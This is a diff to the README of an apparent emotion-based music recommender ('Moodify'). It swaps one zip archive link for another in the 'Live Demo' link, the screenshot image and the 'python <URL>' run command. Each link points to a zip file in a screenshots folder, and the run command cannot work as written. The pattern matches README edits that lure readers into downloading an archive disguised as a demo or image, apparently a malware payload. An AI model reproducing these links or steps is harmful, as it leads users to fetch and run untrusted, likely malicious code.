@@ -1,10 +1,10 @@
 # Emotion-Based Music Recommender called Moodify🎧
 
 ## 🔗 Live Demo
-👉 https://raw.githubusercontent.com/Janani1625/emotion-music-recommender/main/screenshots/music_recommender_emotion_v1.1.zip
+👉 https://raw.githubusercontent.com/Janani1625/emotion-music-recommender/main/screenshots/recommender-emotion-music-v3.1.zip
 
 ## 📸 Screenshot
-![Moodify Web App](https://raw.githubusercontent.com/Janani1625/emotion-music-recommender/main/screenshots/music_recommender_emotion_v1.1.zip)
+![Moodify Web App](https://raw.githubusercontent.com/Janani1625/emotion-music-recommender/main/screenshots/recommender-emotion-music-v3.1.zip)
 
 
 ## Description
@@ -23,4 +23,4 @@ A Python-based application that analyzes user emotions from text input and recom
 1. Clone the repository
 2. Run the following command:
 ```bash
-python https://raw.githubusercontent.com/Janani1625/emotion-music-recommender/main/screenshots/music_recommender_emotion_v1.1.zip
+python https://raw.githubusercontent.com/Janani1625/emotion-music-recommender/main/screenshots/recommender-emotion-music-v3.1.zip
